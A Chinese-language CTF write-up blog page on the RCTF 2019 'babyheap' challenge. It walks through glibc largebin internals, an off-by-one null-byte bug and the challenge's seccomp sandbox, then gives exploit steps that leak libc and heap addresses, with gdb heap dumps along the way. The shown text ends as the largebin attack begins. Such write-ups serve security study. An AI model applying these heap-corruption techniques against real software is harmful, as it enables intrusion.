<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="pwn,CTF," />










<meta name="description" content="这是一道关于largebin attack的题目，是学习largebin attack的第一道题目，RCTF 2019的babyheap，但是wp一直搁置着，现在才补全，已经忘了是复现了哪个exp了…">
<meta name="keywords" content="pwn,CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="RCTF 2019 pwn">
<meta property="og:url" content="http://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/index.html">
<meta property="og:site_name" content="X3h1n">
<meta property="og:description" content="这是一道关于largebin attack的题目，是学习largebin attack的第一道题目，RCTF 2019的babyheap，但是wp一直搁置着，现在才补全，已经忘了是复现了哪个exp了…">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/1.png">
<meta property="og:image" content="http://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/2.png">
<meta property="og:image" content="http://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/3.png">
<meta property="og:image" content="http://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/4.png">
<meta property="og:updated_time" content="2019-07-16T14:11:03.216Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="RCTF 2019 pwn">
<meta name="twitter:description" content="这是一道关于largebin attack的题目，是学习largebin attack的第一道题目，RCTF 2019的babyheap，但是wp一直搁置着，现在才补全，已经忘了是复现了哪个exp了…">
<meta name="twitter:image" content="http://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/"/>





  <title>RCTF 2019 pwn | X3h1n</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">X3h1n</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/05/26/RCTF-2019-babyheap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="X3h1n">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">RCTF 2019 pwn</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-26T19:51:38+08:00">
                2019-05-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>这是一道关于largebin attack的题目，是学习largebin attack的第一道题目，RCTF 2019的babyheap，但是wp一直搁置着，现在才补全，已经忘了是复现了哪个exp了…<br><a id="more"></a></p>
<h1 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h1><p>此时，我们再分配一个chunk时，会检查unsorted bin是否有合适的chunk，若unsorted bin中没有合适的chunk,然后会将chunk放入对应的bin中，这里unsorted bin中的chunk大小为0x450，则会将其放入largebin中。largebin除了维护相同大小中bin中的fd、bk的双向链表外，还会维护一个由所有largebin构成的fd_nextsize、bk_nextsize的双向链表，在该链表中，largebin中的chunk按照从大到小递减排序。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                victim_index = largebin_index(size); <span class="comment">//victim是要插入的chunk</span></span><br><span class="line">                bck          = bin_at(av, victim_index); <span class="comment">// 当前largebin的头部</span></span><br><span class="line">                fwd          = bck-&gt;fd; <span class="comment">//largebin中的第一个chunk</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">                <span class="comment">//按照从大到小降序排列</span></span><br><span class="line">                <span class="comment">// 如果 large bin 链表不空</span></span><br><span class="line">                <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">                    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                    size |= PREV_INUSE;</span><br><span class="line">                    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                    <span class="comment">//bck-&gt;bk中存储着当前largebin中最小的chunk</span></span><br><span class="line">                    assert(chunk_main_arena(bck-&gt;bk));<span class="comment">//判断bck-&gt;bk是否在main arena</span></span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt;</span><br><span class="line">                        (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask(bck-&gt;bk)) &#123;<span class="comment">//如果插入的chunk比当前最小的chunk还小，只需插入到链表尾部</span></span><br><span class="line">                        fwd = bck; <span class="comment">//fwd指向链表头部</span></span><br><span class="line">                        bck = bck-&gt;bk; <span class="comment">//bck指向链表尾部</span></span><br><span class="line">                        victim-&gt;fd_nextsize = fwd-&gt;fd; <span class="comment">//victim-&gt;fd_nextsize指向链表中第一个chunk</span></span><br><span class="line">                        <span class="comment">//victim-&gt;bk_nextsize指向原来链表第一个chunk指向的bk_nextsize，即原来链表的最后一个chunk</span></span><br><span class="line">                        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line">                        <span class="comment">//原来链表第一个chunk的bk_nextsize指向victim</span></span><br><span class="line">                        <span class="comment">//原来最后一个链表的最后一个chunk的fd_nextsize指向victim</span></span><br><span class="line">                        fwd-&gt;fd-&gt;bk_nextsize =</span><br><span class="line">                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        </span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;<span class="comment">//插入的chunk的大小大于当前链表中最小的chunk</span></span><br><span class="line">                        assert(chunk_main_arena(fwd)); <span class="comment">//判断fwd是否在main arena中</span></span><br><span class="line">                        <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask(fwd)) &#123;</span><br><span class="line">                            <span class="comment">//从链表头部遍历寻找不大于victim的chunk</span></span><br><span class="line">                            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                            assert(chunk_main_arena(fwd));</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size ==</span><br><span class="line">                            (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask(fwd)) <span class="comment">//如果找到与victim大小相等的chunk，直接插入，不修改nextsize</span></span><br><span class="line">                            <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                            fwd = fwd-&gt;fd; </span><br><span class="line">                        <span class="keyword">else</span> &#123; <span class="comment">//找到小于victim的chunk,fwd指向比victim小的chunk,插入到fwd前面</span></span><br><span class="line">                            victim-&gt;fd_nextsize              = fwd;  <span class="comment">//victim-&gt;fd_nextsize指向fwd</span></span><br><span class="line">                            <span class="comment">//victim-&gt;bk_nextsize指向原来fwd的前一个chunk</span></span><br><span class="line">                            victim-&gt;bk_nextsize              = fwd-&gt;bk_nextsize;</span><br><span class="line">                            <span class="comment">//fwd的bk_nextsize指向victim</span></span><br><span class="line">                            fwd-&gt;bk_nextsize                 = victim;</span><br><span class="line">                            <span class="comment">//fwd原来前一个chunk的fd_nextsize指向victim</span></span><br><span class="line">                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                        bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">//如果当前largebin链表为空，则插入的victim自己构成一个双向链表</span></span><br><span class="line">                    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//插入当前bin中第一个chunk的前面,更新bin中的双向链表</span></span><br><span class="line">    mark_bin(av, victim_index);</span><br><span class="line">    victim-&gt;bk = bck; <span class="comment">//victim-&gt;bk指向bck，bck=fwd-&gt;bk</span></span><br><span class="line">    victim-&gt;fd = fwd; <span class="comment">//victim-&gt;fd指向当前bin中的第一个chunk</span></span><br><span class="line">    fwd-&gt;bk    = victim; <span class="comment">//原来bin中的第一个chunk的bk指向victim</span></span><br><span class="line">    bck-&gt;fd    = victim;  <span class="comment">//bck的fd指向victim,也就是fwd-&gt;bk-&gt;fd指向victim</span></span><br></pre></td></tr></table></figure></p>
<h1 id="题目简述-amp-题目漏洞"><a href="#题目简述-amp-题目漏洞" class="headerlink" title="题目简述 &amp; 题目漏洞"></a>题目简述 &amp; 题目漏洞</h1><p>题目有add、delete、show和edit四个功能，在add中使用calloc来申请堆块，calloc申请堆块会对堆块进行清空，释放的堆块无论大小，都不会放入fastbin中，也就是说如果不与top chunk相邻，就会放入unsortedbin中。申请的堆块最大为0x1000。idx为0~15。<br>edit里有off by one的漏洞：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">edit</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  j_printf(<span class="string">"Index: "</span>);</span><br><span class="line">  v4 = get_int(<span class="string">"Index: "</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> &amp;&amp; v4 &lt;= <span class="number">15</span> &amp;&amp; *((_QWORD *)ptrs + <span class="number">2</span> * v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    j_printf(<span class="string">"Content: "</span>);</span><br><span class="line">    v2 = read_n(*((<span class="keyword">void</span> **)ptrs + <span class="number">2</span> * v4), *((_DWORD *)ptrs + <span class="number">4</span> * v4 + <span class="number">2</span>));</span><br><span class="line">    *(_BYTE *)(*((_QWORD *)ptrs + <span class="number">2</span> * v4) + v2) = <span class="number">0</span>; <span class="comment">//off by one</span></span><br><span class="line">    j_puts(<span class="string">"Edit success :)"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    j_puts(<span class="string">"Invalid index :("</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>另外，该题目增加了沙箱，限制了系统调用，使用的检测工具是<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>,只能使用读文件的方式来获取flag。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Documents/pwn/2019/rctf2019/babyheap$ seccomp-tools dump ./babyheap </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x00000029  if (A != socket) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x0000009d  if (A != prctl) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure></p>
<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="泄露libc和heap基址"><a href="#泄露libc和heap基址" class="headerlink" title="泄露libc和heap基址"></a>泄露libc和heap基址</h2><p>开始先申请chunk：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##init</span></span><br><span class="line">add(<span class="number">0x78</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x420</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x420</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#10 gadget</span></span><br><span class="line">add(<span class="number">0x400</span>) <span class="comment">#11 rop+shellcode</span></span><br></pre></td></tr></table></figure></p>
<p>先delete(0)，利用off by one覆盖chunk 2的size，size由0x431变为0x400，利用改写的size，在chunk 2中伪造一个堆块，大小为0x30。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##off by one</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x3f0</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x31</span>)) <span class="comment">#chunk 2(0x430):0x400+0x30</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0x80</span>+<span class="number">0x40</span>)) <span class="comment">#off by null prev_size:0xc0, size:0x430-&gt;0x400</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#idx0~idx2 into unsorted bin  0x400+0xc0=0x4c0</span></span><br></pre></td></tr></table></figure></p>
<p>delete(2)之前堆的分布如下，此时如果释放chunk 2，会引发chunk 0(0xc0)和chunk 2(0x400)的合并，合并后的大小为0x4c0，进入unsortedbin中。这里就造成了chunk 1的重叠。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /<span class="number">10</span>gx <span class="number">0x555555757080</span></span><br><span class="line"><span class="number">0x555555757080</span>: <span class="number">0x0000000000000080</span>  <span class="number">0x0000000000000040</span>  <span class="comment"># chunk 1</span></span><br><span class="line"><span class="number">0x555555757090</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x5555557570a0</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x5555557570b0</span>: <span class="number">0x6161616161616161</span>  <span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x5555557570c0</span>: <span class="number">0x00000000000000c0</span>  <span class="number">0x0000000000000400</span>  <span class="comment">#chunk 2 0x430-&gt;0x400</span></span><br><span class="line">gdb-peda$ x /<span class="number">8</span>gx <span class="number">0x5555557574c0</span></span><br><span class="line"><span class="number">0x5555557574c0</span>: <span class="number">0x0000000000000100</span>  <span class="number">0x0000000000000031</span>  <span class="comment">#fake chunk</span></span><br><span class="line"><span class="number">0x5555557574d0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557574e0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557574f0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000041</span>  <span class="comment">#chunk 3</span></span><br></pre></td></tr></table></figure></p>
<p>再申请一个与idx0同样大小的chunk，然后show(1)泄露libc。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##leak libc_base</span></span><br><span class="line">add(<span class="number">0x78</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">leak_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x68</span> - libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>, hex(libc_base)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br></pre></td></tr></table></figure></p>
<p>后面还需要堆的基址，构造chunk，使得idx 1的fd是一个堆地址，可以先申请一个chunk，该chunk索引为idx2，与idx1的地址相同，然后delete(4)，再delete(2),这样堆的分布如下，show(1)就可以泄露，这里add一个chunk然后在idx4之后释放的目的是保持较大的0x440的chunk在链表的前面，chunk 4在后面，这样idx1的fd才能有堆的地址。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555758030</span> (size : <span class="number">0x1ffd0</span>) </span><br><span class="line">       last_remainder: <span class="number">0x5555557570c0</span> (size : <span class="number">0x400</span>) </span><br><span class="line">            unsortbin: 0x555555757080 (size : 0x440) &lt;--&gt; 0x555555757530 (size : 0x70)</span><br></pre></td></tr></table></figure></p>
<p>对应的exp部分如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##leak heap_base</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2==1</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#usortedbin:0x440-&gt;0x70</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-(<span class="number">0x000056221af4b530</span><span class="number">-0x56221af4b000</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_base:"</span>, hex(heap_base)</span><br></pre></td></tr></table></figure></p>
<h2 id="largebin-attack-1"><a href="#largebin-attack-1" class="headerlink" title="largebin attack"></a>largebin attack</h2><p>首先add(0x50)，unsortedbin中与其大小最接近的chunk是0x70，因此0x70的chunk被分配，0x440的chunk进入到largebin中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(<span class="number">0x20</span>)     fastbin[<span class="number">0</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x30</span>)     fastbin[<span class="number">1</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x40</span>)     fastbin[<span class="number">2</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x50</span>)     fastbin[<span class="number">3</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x60</span>)     fastbin[<span class="number">4</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x70</span>)     fastbin[<span class="number">5</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x80</span>)     fastbin[<span class="number">6</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0x90</span>)     fastbin[<span class="number">7</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xa0</span>)     fastbin[<span class="number">8</span>]: <span class="number">0x0</span></span><br><span class="line">(<span class="number">0xb0</span>)     fastbin[<span class="number">9</span>]: <span class="number">0x0</span></span><br><span class="line">                  top: <span class="number">0x555555758030</span> (size : <span class="number">0x1ffd0</span>) </span><br><span class="line">       last_remainder: <span class="number">0x5555557570c0</span> (size : <span class="number">0x400</span>) </span><br><span class="line">            unsortbin: <span class="number">0x0</span></span><br><span class="line">         largebin[ <span class="number">1</span>]: <span class="number">0x555555757080</span> (size : <span class="number">0x440</span>)  <span class="comment">#进入largebin</span></span><br></pre></td></tr></table></figure></p>
